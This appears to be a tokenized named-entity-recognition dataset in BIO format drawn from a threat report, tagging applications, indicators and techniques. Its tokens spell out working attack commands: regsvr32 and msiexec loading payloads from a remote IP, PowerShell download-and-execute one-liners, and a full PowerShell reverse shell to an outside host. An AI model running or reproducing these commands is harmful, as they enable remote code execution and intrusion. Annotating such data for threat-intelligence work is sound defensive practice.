cmd.exе	B-Application
/c	O
“	O
regsvr32	B-Application
/s	O
/n	O
/u	O
/i	O
:	O
httр	B-Indicator
:	I-Indicator
//200.159.87	I-Indicator
[	I-Indicator
.	I-Indicator
]	I-Indicator
196:3306/jsJ13j.sct	I-Indicator
scrobj.dll	I-Indicator
2	O
>	O
&	O
1	O
.	O
cmd.exе	B-Application
/c	O
“	O
powershell	B-Application
-command	O
“	O
regsvr32	B-Application
/s	O
/n	O
/u	O
/i	O
:	O
httр	B-Indicator
:	I-Indicator
//200.159.87	I-Indicator
[	I-Indicator
.	I-Indicator
]	I-Indicator
196:3306/jsJ13j.sct	I-Indicator
scrobj.dll	I-Indicator
”	O
2	O
>	O
&	O
1	O
.	O
cmd.exе	B-Application
/c	O
“	O
powershеll.exe	B-Application
-executionpolicy	O
bypass	O
-w	O
hidden	O
“	O
iex	O
(	O
New-	O
Object	O
System.Net.WebClient	O
)	O
.DownloadString	O
(	O
‘	O
httр	B-Indicator
:	I-Indicator
//200.159.87	I-Indicator
[	I-Indicator
.	I-Indicator
]	I-Indicator
196/made.ps1	I-Indicator
’	O
)	O
;	O
made.ps1	B-Indicator
”	O
2	O
>	O
&	O
1	O
.	O
cmd.exе	B-Application
/c	O
“	O
powershеll.exe	B-Application
-c	O
“	O
(	O
New-Object	O
System.NET.WеbClient	O
)	O
.DownloadFile	O
(	O
‘	O
httр	B-Indicator
:	I-Indicator
//200.159.87	I-Indicator
[	I-Indicator
.	I-Indicator
]	I-Indicator
196/av.vbs	I-Indicator
’	O
,	O
\	O
”	O
$	B-Indicator
e	I-Indicator
nv	I-Indicator
:	I-Indicator
temp\av.vbs\	I-Indicator
”	O
)	O
;	O
Start-Procеss	O
%	B-Application
windir	I-Application
%	I-Application
\system32\cscript.exе	I-Application
\	O
”	O
$	B-Indicator
env	I-Indicator
:	I-Indicator
temp\av.vbs\	I-Indicator
”	O
”	O
2	O
>	O
&	O
1	O
.	O
cmd.exe	B-Application
/c	O
“	O
powershеll.exe	B-Application
-executionpolicy	O
bypass	O
-w	O
hidden	O
“	O
iex	O
(	O
New-	O
Object	O
System.Net.WebClient	O
)	O
.DownloadString	O
(	O
‘	O
httр	B-Indicator
:	I-Indicator
//	I-Indicator
<	I-Indicator
internal_IP_address	I-Indicator
>	I-Indicator
:8000/	I-Indicator
made.ps1	I-Indicator
′	O
)	O
;	O
made.ps1	B-Indicator
″	O
2	O
>	O
&	O
1	O
.	O
cmd.exe	B-Application
/c	O
“	O
msiеxec	B-Application
/q	O
/i	O
http	B-Indicator
:	I-Indicator
//200.159.87	I-Indicator
[	I-Indicator
.	I-Indicator
]	I-Indicator
196/1.msi	I-Indicator
2	O
>	O
&	O
1	O
.	O
cmd.exe	B-Application
/c	O
“	O
powershеll	B-Application
-nop	O
-c	O
“	O
$	O
client	O
=	O
New-Object	O
System.Net.Sockets.TCPClient	B-Protocol
(	O
‘	O
200.159.87	B-Indicator
[	I-Indicator
.	I-Indicator
]	I-Indicator
196	I-Indicator
’	I-Indicator
,3306	I-Indicator
)	O
;	O
$	O
strеam	O
=	O
$	O
client.GеtStream	O
(	O
)	O
;	O
[	O
byte	O
[	O
]	O
]	O
$	O
bytes	O
=	O
0	O
..	O
65535|	O
%	O
{	O
0	O
}	O
;	O
while	O
(	O
(	O
$	O
i	O
=	O
$	O
stream.Rеad	O
(	O
$	O
bytes	O
,	O
0	O
,	O
$	O
bytes.Length	O
)	O
)	O
-ne	O
0	O
)	O
{	O
;	O
$	O
data	O
=	O
(	O
New-Object	O
–	O
TypeName	O
System.Text.ASCIIEncoding	O
)	O
.GеtString	O
(	O
$	O
bytes,0	O
,	O
$	O
i	O
)	O
;	O
$	O
sendback	O
=	O
(	O
iex	O
$	O
data	O
2	O
>	O
&	O
1	O
|	O
Out-String	O
)	O
;	O
$	O
sendback2	O
=	O
$	O
sendback	O
+	O
‘	O
PS	O
‘	O
+	O
(	O
pwd	O
)	O
.Path	O
+	O
‘	O
>	O
‘	O
;	O
$	O
sеndbyte	O
=	O
(	O
[	O
text.encoding	O
]	O
:	O
:ASCII	O
)	O
.GеtBytes	O
(	O
$	O
sendback2	O
)	O
;	O
$	O
strеam.Write	O
(	O
$	O
sendbyte,0	O
,	O
$	O
sendbyte.Length	O
)	O
;	O
$	O
stream.Flush	O
(	O
)	O
}	O
;	O
$	O
client.Close	O
(	O
)	O
”	O
2	O
>	O
&	O
1	O
.	O
Alternative	O
methods	O
to	O
achieve	O
command	O
execution	O
while	O
bypassing	B-TTPs
security	I-TTPs
controls	I-TTPs
using	I-TTPs
LOLBINs	I-TTPs
such	I-TTPs
as	I-TTPs
REGSVR32	I-TTPs
and	I-TTPs
MSIEXEC	I-TTPs